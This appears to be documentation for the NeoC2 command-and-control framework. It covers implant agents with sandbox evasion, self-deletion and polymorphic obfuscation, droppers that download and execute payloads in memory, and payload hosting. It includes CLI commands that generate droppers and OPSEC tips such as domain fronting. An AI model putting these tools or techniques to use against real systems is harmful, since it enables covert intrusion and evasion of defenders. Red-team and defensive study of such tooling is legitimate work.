# NeoC2 Agent Documentation

## Table of Contents
- [Go Agent](#go-agent)
- [Phantom Hawk Agent](#phantom-hawk-agent)


---

## Go Agent

### Description
The Go Agent is an exe compiled, multi-functional agent with features like file transfer, interactive mode, and windows powershell/linux based module execution.

### Tested
- Windows x64

### Capabilities
- **Command Execution**: Execute arbitrary shell commands on the target system
- **File Transfer**: Upload and download files using base64 encoding
- **Interactive Mode**: Enter real-time interactive session with the target
- **TTY Shell Enabled**: Enter a full TTY Shell 
- **Jitter & Sleep Obfuscation**: Configurable sleep intervals with jitter during agent generation and in deployment
- **Cross-Platform**: Works on Windows, Linux, and macOS 
- **Module Execution Capability**: Runs extensible modules from C2
- **Sanbox & Debugger Detection**: Self deletes in sandboxed environment
  
### Usage
```
payload go_agent <listener_name> 

#Sleep customization
NeoC2 > sleep 10

# Kill Agent
NeoC2 > kill
```


---


## Phantom Hawk Agent 

### Description
Phantom Hawk is an EXPERIMENTAL Python variant. Not intended to be deployed in real team engagements. 

### Tested
- Windows x64
- Linux Debian

### Capabilities
- **Command Execution**: Execute arbitrary shell commands on the target system
- **Anti Debugging, Sandbox Detection & Self Deletion**: Works on Windows, Linux Hosts. 
- **File Transfer**: Upload and download files using base64 encoding
- **Interactive Mode**: Enter real-time interactive session with the target
- **TTY Shell Enabled**: Enter a full TTY Shell 
- **Polymorphic Obfuscation**: Randomized variable and function names to evade static analysis
- **Jitter & Sleep Obfuscation**: Configurable sleep intervals with jitter during agent generation and in deployment
- **Cross-Platform**: Works on Windows, Linux, and macOS 
- **Module Execution Capability**: Runs extensible modules from C2
- **P2P Agent Communication**: Configurable Agent command forwarding to other Agents in same network.
- **Sanbox & Debugger Detection**: Self deletes in sandboxed environment
- **Embedded Coff-loader**: Execute BOFs. Compile your own COFFLoader64.exe and place in the /agents directory. 

### Limitations
- Larger payload size due to comprehensive feature set
- Network communication may be detected by advanced network monitoring
- May be flagged by advanced Python-based threat detection tools

### Usage
```
payload phantom_hawk <listener_id> [output_file] [--obfuscate] [--disable-sandbox]
payload pahntom_hawk myhttps 
payload phantom_hawk myhttps --disable-sandbox

# Execute BOFs
NeoC2 > coff-loader <agent_id> <bof>
#Change profile sleep configuration
NeoC2 > sleep 10
#Kill Agent
NeoC2 > kill

```


## Droppers

### Description
**IMPORTANT: These are DROPPERS only** - they download an agent from `/api/assets/main.js`, execute it, and then delete themselves. They do NOT contain interactive capabilities or command execution features. These are designed purely for initial access and agent deployment.

### Supported Types

#### PowerShell Dropper
After XOR Decryption. Instead of writing the decrypted payload to disk, which would make it easier to detect, the script leverages .NET to allocate memory within the PowerShell process itself. Then copy into the allocated memory and changes the memory protection attributes of the allocated memory region via VirtualProtect to 0x40 (PAGE_EXECUTE_READWRITE). This enables the execution of the shellcode. GetDelegateForFunctionPointerto create a delegate instance that points to the beginning of the shellcode in memory. Then use the Invoke() method to execute the shellcode. Launching the in-memory beacon.
- **Windows compatibility only**
- **Supports shellcode execution only**
- **Downloads agent** from `/api/assets/main.js` endpoint
- **Self-deletes** Post-execution
- **Encoded** Using PowerShell encoding to evade detection

#### Bash Dropper (nohup)
- **Linux/macOS compatibility**
- **Downloads agent** from `/api/assets/main.js` endpoint
- **Self-executes** the downloaded agent using nohup for background operation
- **Self-deletes** after execution
- **Encoded** in base64 to evade simple string detection
- **Binary payload support**: Can execute binary files after temporary storage
- **Python payload support**: Can execute Python scripts in-memory (stealthy)

### Usage
```
stager generate powershell_dropper host=<c2_host> port=<c2_port> [protocol=https] [download_uri=/api/assets/main.js]
stager generate bash_dropper host=<c2_host> port=<c2_port> [protocol=https] [download_uri=/api/assets/main.js]
```

---

## Payload Upload Feature

### Description
NeoC2 supports uploading custom payloads directly through the web interface, allowing operators to deploy binary executables like .exe, .dll, or other file types in addition to Python scripts.

### Capabilities
- **Multi-Format Support**: Upload EXE, DLL, PY, JS, VBS, BAT, PS1, and other binary/script files
- **Encryption**: XOR encryption using SECRET_KEY environment variable with Base64 encoding
- **Web Interface**: Easy upload via Tools > Payload Upload in the web UI
- **Automatic Serving**: Uploaded payloads automatically available at `/api/assets/main.js`
- **Intelligent Execution**: Droppers automatically detect payload type and handle appropriately
- **Maximum Size**: Supports payloads up to 50MB
- **Overwrite Functionality**: New uploads replace previous payloads
- **Python Support**: Python scripts execute in-memory (stealthy)
- **Binary Support**: Binary files execute from temporary location with automatic cleanup

### Usage
1. Navigate to **Tools > Payload Upload** in the web interface
2. Select your payload file (EXE, DLL, PY, JS, etc.) up to 50MB
3. The payload is automatically XOR encrypted and Base64 encoded
4. Use droppers to download from `/api/assets/main.js` and execute the payload
5. The same endpoint works with cross-platform stager

#### Example Usage:
```
# Upload your binary/exe file via the web client
# Then deploy droppers pointing to web client PROTOCOL://IP:PORT
NeoC2 > stager generate powershell_dropper host=<c2_host> port=<c2_port>
NeoC2 > stager generate bash_dropper host=<c2_host> port=<c2_port>
```

### Payload Handling
- **Python Scripts**: Executed in-memory by droppers without writing to disk (stealthy)
- **Binary Files (EXE, DLL, etc.)**: Written to temporary directory, executed, and cleaned up automatically
- **Encryption**: All payloads encrypted using XOR with SECRET_KEY and Base64 encoded for safe transmission
- **Cleanup**: Temporary files are automatically removed after execution for binary payloads

## Agent Configuration and Profiles

All agents utilize communication profiles for consistent C2 communication. Profiles define:
- C2 server endpoints and URIs
- HTTP headers and user agents
- Sleep intervals and jitter
- Heartbeat behavior
- Communication protocols (HTTP/HTTPS)

Profiles can be managed via:
- Web UI: Profiles section
- CLI: `profile add <json_file>`
- Programmatically through the API

---

## Security Considerations

### Obfuscation Techniques
- **Polymorphic Variables**: All agents use randomized variable and function names
- **Dead Code Injection**: Benign code is injected to increase entropy
- **String Encoding**: Sensitive strings are encoded using various techniques
- **Control Flow Obfuscation**: Code execution patterns are randomized

### Detection Vectors
- Network traffic patterns to C2 server
- Process creation patterns
- File system artifacts (if any)
- Memory artifacts during execution


### Operational Security
- Use HTTPS where possible for C2 communication
- Implement proper domain fronting when available
- Use appropriate sleep intervals and jitter settings
- Consider the target environment's security posture
- Test agents in similar environments before deployment

